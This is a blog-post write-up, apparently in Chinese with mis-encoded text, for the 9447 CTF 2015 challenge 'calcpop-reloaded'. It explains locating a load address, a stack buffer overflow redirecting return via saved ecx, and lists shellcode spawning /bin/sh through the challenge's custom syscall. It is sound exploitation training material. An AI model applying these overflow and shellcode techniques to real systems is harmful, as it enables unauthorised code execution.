<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.83.1"><title>Writeup-9447 CTF: calcpop-reloaded - /home/cubl</title><meta property="og:title" content="Writeup-9447 CTF: calcpop-reloaded - /home/cubl"><link href=/favicon.ico rel=icon type=image/x-icon><meta name=description content="Pwning for fun."><link rel=stylesheet href=https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@gh-pages/css/main.min.9861353c7baacf2268a74fe7ea9d3bd8211eada1554a630c4d29fb448bfae5fb8f43ea02baa52d2ca079d0027f37aa8f058ab0362f4301e9a9b77538d71b549b.css media=all></head><body><div class=wrapper><header class=header><nav class=nav><a href=/ class=nav-logo><img src=/images/logo-min.png width=50 height=50 alt=Logo></a><ul class=nav-links><li><a href=/>Index</a></li><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li><li><a href=https://github.com/cubarco/cubarco.github.io>GitHub</a></li></ul></nav></header><main class=content role=main><article class=article><h1 class=article-title>Writeup-9447 CTF: calcpop-reloaded</h1><span class=article-date>2015-12-04</span>
<a class=article-tag href=/tags/hack>Hack</a>
<a class=article-tag href=/tags/ctf>CTF</a>
<a class=article-tag href=/tags/writeup>Writeup</a>
<a class=article-tag href=/tags/exploitation>Exploitation</a><div class=article-content><p><em>ä»è¿™ä¸€é¢˜å¼€å§‹ï¼Œ9447 åŠ ä¸Šäº† POW, å…¶å®åªè¦çˆ†ç ´å°±å¯ä»¥ï¼Œè¿™é‡Œå°±ä¸æ”¾è„šæœ¬äº†ã€‚ï¼ˆå…³äº POW, æœ‰ä¸ªå« hashcash çš„ä¸œè¥¿ï¼ŒæŒºæœ‰æ„æ€çš„ï¼‰</em></p><p>è¿™é“é¢˜æˆ‘æ²¡æœ‰åœ¨æ¯”èµ›æœŸé—´åšå‡ºæ¥ã€‚å½“æ—¶å®Œå…¨æ²¡æœ‰é€†å‘ load address æœªçŸ¥çš„äºŒè¿›åˆ¶çš„ç»éªŒï¼Œä»€ä¹ˆéƒ½å¹²ä¸äº†ã€‚åæ¥ç®€å•çœ‹äº†åˆ«äººçš„ writeupï¼Œåœ¨åªçŸ¥é“é€†å‘æ–¹æ³•çš„æƒ…å†µä¸‹é‡æ–°åšå‡ºäº†è¿™é¢˜ã€‚å‰åå¤§æ¦‚è¿˜æ˜¯èŠ±äº†ä¸ƒå…«å°æ—¶ï¼ˆæˆ‘å¥½æ¸£&mldr;ï¼‰ï¼Œç¡¬ç€å¤´çš®å†™ç¯‡ writeup è®°å½•ä¸€ä¸‹ã€‚</p><h2 id=load-address>Load Address</h2><p>æ‰¾ load address çš„è¿‡ç¨‹å¤§æ¦‚æ˜¯å…ˆç”¨ radare æ‰“å¼€ï¼Œç„¶åç¿»åæ±‡ç¼–ä»£ç ï¼Œå¯ä»¥æ‰¾åˆ°<code>mov eax, 0x1007a7</code>è¿™ç±»ä»£ç ï¼Œå¤§æ¦‚å¯ä»¥çŒœå‡º load address åœ¨ 0x100000.</p><p>ç”¨ IDA æ‰“å¼€ï¼Œå¡«å¥½ load offset, å¼€å§‹è°ƒè¯•ã€‚å¯ä»¥çŒœå‡º main å‡½æ•°(?)çš„ä½ç½®å¤§æ¦‚åœ¨ 0x1008bc.</p><h2 id=overflow>Overflow</h2><p>æ¥ä¸‹æ¥æ‰¾æº¢å‡ºç‚¹ã€‚å¯ä»¥çœ‹åˆ° 0x001008EE å¤„è°ƒç”¨äº†è¾“å…¥å‡½æ•°ï¼Œåˆ†é…æ ˆç©ºé—´æ˜¯ 0x98, ä½†æ˜¯ä¼ é€’äº†ä¸€ä¸ªå¤§æ¦‚æ˜¯ size çš„å‚æ•°ï¼Œå€¼ä¸º 0x100. å­˜åœ¨æº¢å‡ºã€‚</p><p>è¿™é¢˜å’Œ calcpop æœ‰ä¸€ç‚¹ä¸åŒçš„æ˜¯ï¼Œcalcpop ä¸­è¾“å…¥ exit ä¼šç›´æ¥é€€å‡º main å‡½æ•°ï¼Œè¿™é¢˜è¾“å…¥ exit ä¼šè°ƒç”¨<code>shutdown()</code>ä¹‹ç±»çš„å‡½æ•°ï¼Œæ²¡ç»†çœ‹ï¼Œæ•ˆæœå°±æ˜¯ä¸ä¼šå†æœ‰è¾“å‡ºäº†ã€‚è¿™é“é¢˜é€€å‡º main å‡½æ•°çš„æ–¹æ³•æ˜¯ï¼Œæ­£ç¡®è¾“å…¥ï¼Œè®©è®¡ç®—ç»“æœä¸º 201527, ç¨‹åºä¼šè¾“å‡ºå½©è›‹ä¿¡æ¯ï¼Œç„¶åé€€å‡º main å‡½æ•°ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆæº¢å‡ºäº†ï¼Œå…ˆçœ‹ main å‡½æ•°å…¥å£å’Œå‡ºå£å¤„çš„æ ˆå˜åŒ–ï¼š</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=c1>; entry:</span>
<span class=nf>lea</span>     <span class=nb>ecx</span><span class=p>,</span> <span class=p>[</span><span class=nb>esp</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
<span class=nf>and</span>     <span class=nb>esp</span><span class=p>,</span> <span class=mh>0FFFFFFF0h</span>
<span class=nf>push</span>    <span class=kt>dword</span> <span class=nv>ptr</span> <span class=p>[</span><span class=nb>ecx</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
<span class=nf>push</span>    <span class=nb>ebp</span>
<span class=nf>mov</span>     <span class=nb>ebp</span><span class=p>,</span> <span class=nb>esp</span>
<span class=nf>push</span>    <span class=nb>edi</span>
<span class=nf>push</span>    <span class=nb>esi</span>
<span class=nf>push</span>    <span class=nb>ebx</span>
<span class=nf>push</span>    <span class=nb>ecx</span>

<span class=c1>; exit:</span>
<span class=nf>lea</span>     <span class=nb>esp</span><span class=p>,</span> <span class=p>[</span><span class=nb>ebp</span><span class=o>-</span><span class=mh>10h</span><span class=p>]</span>
<span class=nf>xor</span>     <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
<span class=nf>pop</span>     <span class=nb>ecx</span>
<span class=nf>pop</span>     <span class=nb>ebx</span>
<span class=nf>pop</span>     <span class=nb>esi</span>
<span class=nf>pop</span>     <span class=nb>edi</span>
<span class=nf>pop</span>     <span class=nb>ebp</span>
<span class=nf>lea</span>     <span class=nb>esp</span><span class=p>,</span> <span class=p>[</span><span class=nb>ecx</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
<span class=nf>retn</span>
</code></pre></div><p>æº¢å‡ºåˆ°ä¿å­˜ ecx çš„ä½ç½®ï¼Œä½¿ ecx - 4 æŒ‡å‘å­˜æœ‰ shellcode åœ°å€çš„æ ˆä½ç½®ï¼Œç„¶å ret å°±èƒ½è·³è½¬åˆ° shellcode.</p><h2 id=shellcode>Shellcode</h2><p>è¿™é¢˜æ€ä¹ˆå†™ shellcode ä¹Ÿæ˜¯ä¸€ä¸ªéš¾ç‚¹ï¼Œå› ä¸ºç³»ç»Ÿæ˜¯ 9447 å†™çš„ï¼Œä¸èƒ½ç›´æ¥ç”¨ execv ç³»ç»Ÿè°ƒç”¨ã€‚æ‰€å¹¸çš„æ˜¯æœ¬é¢˜çš„ç³»ç»Ÿè°ƒç”¨åŠŸèƒ½éƒ½æ˜¯èƒ½ä»ä¸€äº›å­—ç¬¦ä¸²ä¸Šçœ‹å‡ºæ¥çš„ã€‚æ¯”å¦‚<code>read(%d %x %d)</code>, <code>write(%d %x %d)</code>ä¹‹ç±»ã€‚strings ä¸€ä¸‹å¯ä»¥çœ‹åˆ°<code>spawn(%x %x %d)</code>ï¼Œæˆ‘å°±çŒœæµ‹è¿™ä¸ªæ˜¯ç±»ä¼¼ execv çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¯æ˜¯å‚æ•°ä¸æ˜ç¡®ï¼Œç‰¹åˆ«æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚è¯•äº†å‡ æ¬¡ï¼Œå‘ç°ç”¨<code>spawn("/bin/sh", "/bin/sh", 1)</code>è¿™æ ·çš„å‚æ•°æ˜¯å¯ä»¥æˆåŠŸçš„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•° 1 å…·ä½“æ˜¯ä»€ä¹ˆå«ä¹‰ï¼Œæˆ‘ä¹Ÿæ²¡ææ˜ç™½ã€‚</p><p>ç”¨ pwntool ç”Ÿæˆçš„ shellcode å¦‚ä¸‹:</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=c1>; push &#39;/bin/sh\x00&#39;</span>
<span class=nf>push</span> <span class=mh>0x1010101</span>
<span class=nf>xor</span> <span class=kt>dword</span> <span class=nv>ptr</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=mh>0x169722e</span>
<span class=nf>push</span> <span class=mh>0x6e69622f</span>
<span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>esp</span>

<span class=nf>push</span> <span class=mh>0x1</span>
<span class=nf>push</span> <span class=nb>edi</span>
<span class=nf>push</span> <span class=nb>edi</span>
<span class=nf>push</span> <span class=mh>0xdeadbeef</span>  <span class=c1>; junk</span>
<span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mi>302125832</span>
<span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0x12121212</span>
<span class=nf>call</span> <span class=nb>ebx</span>  <span class=c1>; spawn(%x, %x, %d)</span>
</code></pre></div><h2 id=exppy>exp.py</h2><p>å¯ä»¥ç”¨ redos ä¸­çš„ level1 æœ¬åœ°è°ƒè¯•ã€‚</p><div class=gist data-gist=cubarco/b4aee1ac22f1b3039d30><p>Gist: <a href=https://gist.github.com/cubarco/b4aee1ac22f1b3039d30>cubarco/b4aee1ac22f1b3039d30</a></p></div></div></article><script src=https://utteranc.es/client.js repo=cubarco/cubarco.github.io issue-term=pathname label="Comments ğŸ’¬" theme=boxy-light crossorigin=anonymous async></script></main><footer class=footer><ul class=footer-links><li><a href=/index.xml type=application/rss+xml target=_blank>RSS feed</a></li><li><a href=https://gohugo.io/ class=footer-links-kudos target=_blank rel="noopener norefferrer">Made with <img src=/images/hugo-logo.png alt="Img link to Hugo website" width=22 height=22></a></li><li><a>Â© 2014 - 2015</a></li></ul></footer></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js async></script><script src=https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@gh-pages/js/main.min.60d77477267181e7581bba5435ded18ab8ff1db3955dde2d3afeec25cc51d24e32b178b6c1ebb5edc2a4cef04c8f592408eb2811f0c78c9295b8a0939977a6a1.js async></script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-54867602-1','auto'),ga('send','pageview'))</script><script async defer data-website-id=e9fdcc32-0bfa-4de5-beb0-3bbf1e4638ab src=https://umami.pwn.ooo/umami.js></script></body></html>